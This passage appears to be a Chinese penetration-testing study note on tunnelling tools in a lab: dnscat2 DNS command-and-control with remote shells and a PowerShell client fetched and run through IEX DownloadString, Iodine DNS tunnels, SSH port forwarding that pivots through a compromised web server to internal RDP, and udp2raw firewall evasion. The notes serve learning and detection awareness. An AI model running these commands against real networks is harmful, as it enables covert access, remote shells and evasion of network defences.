apt-get install ruby-dev   // 用于安装 Ruby 开发工具包，以便编译和安装带有本地扩展的 gem。
bundle install --path ~/.gem    //gems 安装到用户的主目录中，避免权限问题
ruby dnscat2.rb //运行
```

使⽤dnscat2隧道的模式有两种，分别是直连模式和中继模式。
直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求
中继模式：DNS经过互联⽹的迭代解析，指向指定的DNS服务器

直连操作

```ruby
直连服务端：sudo  ./dnscat2.rb -s 553 -c password --no-cache
 -e：指定安全级别，open表示服务端运行客户端不进行加密
 -c：指定密钥
 --no-cache：禁止缓存，一定添加该选项，因为powershell-dnscat2客户端域dnscat2服务端的Caching模式不兼容
```

```
客户端：dnscat2-client.exe --dns server=192.168.1.133,port=553 --secret=password (win)
./dnscat  --dns server=192.168.88.185,port=553 --secret=password (linux)
注：dnscat2-v0.07-client-win32 这里下的是这个win版本 我这里改过名字，不影响
```

建立会话界面

<img src="image-20240822161734646.png" alt="image-20240822161734646" style="zoom:80%;" />

```
服务端控制台输入：windows，可看客户端id，最开始为1
window -i 1 //进入1通道
shell //会在新的通道生成交互式shell，通道为2
ctrl+z //退出1
window //再次查看通道
window -i 2 //进入2，进入交互shell
如若中文乱码终端输入chcp 65001

---------------------------------------
相关命令
clear（清屏）
delay（修改远程会话超时时间）
exec（执行远程机上的程序）
shell（得到一个反弹shell）
download/upload（两端之间上传下载文件）
supend（返回到上一层，等于快捷键ctrl+z）

```

<img src="image-20240822164032265.png" alt="image-20240822164032265" style="zoom:67%;" />

直连的流量特征也是很明显的，在请求日志中，所有的域名都是以 dnscat 开头的，因此防火墙可以很容易地将直连模式的通信检测出来。



![image-20240822143204174](image-20240822143204174.png)

中继模式

```
-e 指定安全级别，open 表示服务端允许客户端不进⾏加密
ruby ./dnscat2.rb test.com -c password --no-cache -e open
dnscat2-client.exe --dns domain=test.com --secret=password
```

#### dnscat2 -powershell

支持powershell大于2的版本， dnscat2  客户端ps脚本

仓库地址： https://github.com/lukebaggett/dnscat2-powershell?tab=readme-ov-file

具体使用：https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/

```
原文章服务端：sudo ruby dnscat2.rb --dns “domain=test,host=192.168.56.1” --no-cache
我用高版本用文章的会报错，用高版本的可以用我这个
服务端：ruby ./dnscat2.rb --dns domain=test,host=192.168.88.185 --no-cache
--------------------------------------------------------------------
客户端： 
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/
lukebaggett/dnscat2-powershell/master/dnscat2.ps1') //外部下载，可以改成自己vps地址，开启web服务下载

Import-Module .\dnscat2.ps1  引入ps脚本(本地有的情况)
Start-Dnscat2 -Domain test -DNSServer 192.168.56.1
试了一下也是可以执行命令，但是比较鸡肋。回显速度比上面方法要慢很多
```

参考：[『DNS隧道工具』— dnscat2-CSDN博客](https://blog.csdn.net/localhost01/article/details/86591685)

#### Iodine DNS隧道搭建

Iodine 是一个用于在 DNS（域名系统）上创建隧道的工具，通常用于绕过网络限制或进行隐蔽通信。它的工作原理基于将数据嵌入到 DNS 查询和响应中，通过这种方式将数据传输穿越到网络防火墙或过滤器

Iodine 项目地址：[Releases · yarrick/iodine (github.com)](https://github.com/yarrick/iodine)

https://code.kryo.se/iodine/ 这里window版本下的编译版本都有，以及各操作系统下的软件源等等，建议看这里

window端下载之后，还要下载tap网卡[ATP网卡驱动](https://swupdate.openvpn.org/community/releases/tap-windows-9.9.2_3.exe)还要以管理员身份运行，运行杀软还会报毒，相当鸡肋

![image-20240820153607677](image-20240820153607677.png)

kali上自带Iodine，debian系列，centos都有软件源提供，相关下载命令

```
apt-get install Iodine
```

```
yum -y install iodine
```

服务端：iodined -f -c -P 123456 192.168.200.1 ns1.域名 -DD

```
-f：在前台运行
-c：禁止检查所有传入请求的客户端IP地址。
-P：客户端和服务端之间用于验证身份的密码。
-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。
```

客户端上连会显示

<img src="image-20240820153805385.png" alt="image-20240820153805385" style="zoom:67%;" />

客户端：iodine.exe -f -P 123456 ns1.域名

<img src="image-20240820151739452.png" alt="image-20240820151739452" style="zoom:67%;" />

这里会发现这里添加了一个192.168.200.2的ip

这个网址是检查iodine域名是否生效

网址：https://code.kryo.se/iodine/check-it/ 输入域名即可验证是否生效

<img src="image-20240820154509876.png" alt="image-20240820154509876" style="zoom:67%;" />

服务端会多出一个dns0的虚拟网卡，192.168.200.1

![image-20240820154411706](image-20240820154411706.png)

​			相互ping通隧道就能建立

![image-20240820152121020](image-20240820152121020.png)

### SSH隧道

在内网中，几乎所有的Linux/UNIX服务器和网络设备都支持SSH协议。在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。

利用起来有一定的条件，使用ssh隧道相关的技术需要root权限，windows上大多数型号没有SSH所以无法使用Windows主机作为跳板机来实现建立隧道。这几年比较新的版本内置SSH。比如：Windows Server 2022、Windows Server 2019、Windows 11、Windows 10

具体参考：https://learn.microsoft.com/zh-cn/windows-server/administration/openssh/openssh_install_firstuse?tabs=gui

#### 什么是跳板机？

跳板机（Jump Server 或 Bastion Host）通常部署在**内外网的边界区域**，即**受控的中间区域**（如 DMZ 区域），它充当外部用户和内网资源之间的安全桥梁。

#### 跳板机的功能和位置

1. **功能**：
   - 跳板机主要用于对外部用户的访问进行控制和审计。它通过限制直接访问内网的敏感资源，提供一个集中管理、控制和审计访问行为的通道。

2. **部署位置**：
   - **DMZ 区域**：跳板机通常位于 DMZ（Demilitarized Zone，非军事区）中，这个区域受到严格的防火墙规则保护，介于外部网络和内部网络之间。
   - **内网与外网之间**：跳板机可能部署在内网和外网之间的边界，允许外部用户通过跳板机访问内网资源，而不会直接暴露内网。

3. **访问方式**：
   - 跳板机通常通过 **SSH** 协议访问，尤其在 Linux/Unix 系统中。外部用户通过 SSH 登录到跳板机，然后从跳板机再进一步访问内网中的服务器或其他资源。
   - 对于 Windows 系统，可能使用 RDP（远程桌面协议）或专门的跳板机工具进行访问。

#### 典型访问流程

1. #### **用户连接跳板机**：
   
   - 用户通过 SSH（或 RDP）连接到跳板机，通常需要通过身份验证（如用户名/密码、SSH 密钥、二步验证等）。
   
2. **通过跳板机访问内网资源**：
   - 成功登录到跳板机后，用户可以从跳板机发起连接到内网中的其他服务器（如数据库、应用服务器等）。

3. **审计与监控**：
   - 跳板机通常会记录所有访问日志、命令执行记录，并进行实时监控，以确保安全和合规性。

#### 跳板机的安全性考虑

- **身份验证**：跳板机应当配置强大的身份验证机制，防止未经授权的访问。
- **日志记录**：跳板机必须启用详细的日志记录，以便在出现问题时能够追溯用户的操作。
- **最小权限**：在跳板机上为用户分配最小权限，确保用户只能访问其工作所需的资源。

通过跳板机，可以显著提高对内网资源访问的安全控制。如果你在具体配置或部署方面有更多问题或需求，可以告诉我，我会进一步提供帮助。

开源项目：https://github.com/jumpserver/jumpserver  了解一下也好

#### SSH隧道常用参数

```SSH
-C：压缩传输，提高传输速度

-f：将SSH传输转入后台执行，不占用当前的Shell

-N：建立静默连接(建立了连接，但是看不到具体会话)

-g：允许远程主机连接本地用于转发的端口

-L：本地端口转发

-R：远程端口转发

-D：动态转发(SOCKS代理)

-P：指定SSH端口
```

#### 	SSH本地转发

目前有这样的一个环境，外网有一台攻击主机 ，可访问处于内网环境的 Web 服务器（双网卡），但无法访问 Web 服务器所在内网的办公主机，接下来就用 SSH 进行流量转发，使外网的攻击主机通过 Web 服务器访问到位于内网的办公主机。

```
攻击机kali：192.168.88.185  内网win机：10.10。10.135 web机Ubuntu双网卡：192.168.88.154  10.10.10.137
本地转发的格式
ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP
在攻击机kali执行
ssh -CfNg -L 4000:10.10.10.135:3389 root@192.168.88.154
把web机子作为跳板机，使得能直接访问内网的3389服务
```



当你在本地访问 `localhost:4000` 时，流量会通过 SSH 隧道发送到 `192.168.88.154`。

然后，`192.168.88.154` 会将流量转发到它能访问的内部网络中的 `10.10.10.135:3389`。

最终，你在本地通过 `localhost:4000` 可以像直接连接到 `10.10.10.135:3389` 一样访问该主机上的 RDP 服务。

在kali上输入:rdesktop 127.0.0.1:4000![image-20240825162814561](image-20240825162814561.png)

#### SSH远程转发

远程转发是本地转发的反向操作。它允许你将 SSH 服务器上的某个端口的数据转发到你本地机器上的指定端口。

远程转发在这里其实也可以说是反向代理，目前有这样的一个环境：内网中不存在边界设备，但是内网的 Web 服务器能访问到攻击主机，而内网的办公主机则不行。

因此可以在拿到 Web 服务器的 Shell 后，采用远程转发的方式，即利用 Web 服务器 SSH 连接到攻击主机上进行代理转发，然后访问攻击主机的端口即可。



```
 在web机子里面输入这个，其实就是跟本地转发相反
 ssh -CfNg -R 3388:10.10.10.135:3389 root@192.168.88.185
 格式： ssh -CfNg -R 攻击主机端口:内网办公主机IP:内网办公主机端口 攻击主机ssh用户名@攻击主机IP
 netstat -antp查看3388有无开启 访问3388即可访问内网3389的主机
```

假设你在远程服务器 `192.168.88.185` 上，并且你需要访问一个内部网络中的 Windows 远程桌面服务，该服务位于 `10.10.10.135` 的 `3389` 端口。由于你无法直接从 `192.168.88.185` 访问这个服务，可以通过 SSH 远程端口转发来实现。通过这条命令，任何连接到 `192.168.88.185:3388` 的请求，都会被转发到 `10.10.10.135:3389`。

![image-20240825172111484](image-20240825172111484.png)

![image-20240825172620995](image-20240825172620995.png)

#### SSH动态转发

动态转发可以将 SSH 客户端变成一个 SOCKS 代理服务器，允许你通过 SSH 隧道动态地将网络流量重定向到多个不同的目标。

动态转发需要攻击主机能够访问到目标主机

```SSH
格式：ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP
攻击机输入：ssh -CfNg -D 4444 root@192.168.88.154
```

动态转发其实就是建立一个 socks 连接，任何支持 socks 4/5 协议的程序都可以使用这个加密通道进行访问，例如这里以 proxychains 为例，借助 proxychains 从攻击主机访问到内网的办公主机的 3389 端口。

<img src="image-20240825174132585.png" alt="image-20240825174132585" style="zoom:80%;" />

在proxychains里面设置代理

```
socks5 127.0.0.1 4444
访问内网机
proxychains rdesktop 10.10.10.135:3389
```

![image-20240825174653344](image-20240825174653344.png)

很明显动态转发的灵活度更高。避免了本地转发远程转发要写死服务端口

参考：https://blog.csdn.net/daocaokafei/article/details/117718130

扩展：https://cloud.tencent.com/developer/article/1125596

`rdesktop` 是一个第三方 RDP 客户端，在连接 Windows 系统时，可能会触发与默认 Windows RDP 客户端不同的行为，导致远程计算机屏幕熄灭。这可能是因为 `rdesktop` 的实现方式或者 Windows 系统的设置在检测到非原生客户端连接时，默认处理方式会不同。

流量查看

![image-20240825181327066](image-20240825181327066.png)

### UDP隧道

#### udp2raw的介绍

该⼯具可以利⽤原始套接字并通过伪造的TCP/UDP/ICMP流量来帮助研究⼈员绕过UDP防⽕墙（或不稳定的UDP环
境）。其⽀持⼼跳保活、⾃动重连，重连后会恢复上次连接，在底层掉线的情况下可以保持上层不掉线。同时有加密、防
重放攻击、信道复⽤的功能。

地址：https://github.com/wangyu-/udp2raw

参考：[Udp2raw-Tunnel：一款功能强大的UDP隧道工具 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/187069.html)

服务端

```
./udp2raw_amd64 -s -l0.0.0.0:4096 -r127.0.0.1:7777 -k "passwd" --raw-mode faketcp --cipher-mode xor -a
```

![image-20240825184218860](image-20240825184218860.png)

客户端

```
./udp2raw_amd64 -c -l0.0.0.0:3333 -r192.168.88.185:4096 -k "passwd" --raw-mode faketcp  --cipher-mode xor -a 
```

![image-20240825184249436](image-20240825184249436.png)

`udp2raw` 建立隧道后，其流量的处理方式与普通的网络流量有所不同，因为它伪装了UDP流量，使其看起来像合法的TCP流量，从而绕过防火墙或网络限制。该工具默认要求要root权限。了解即可


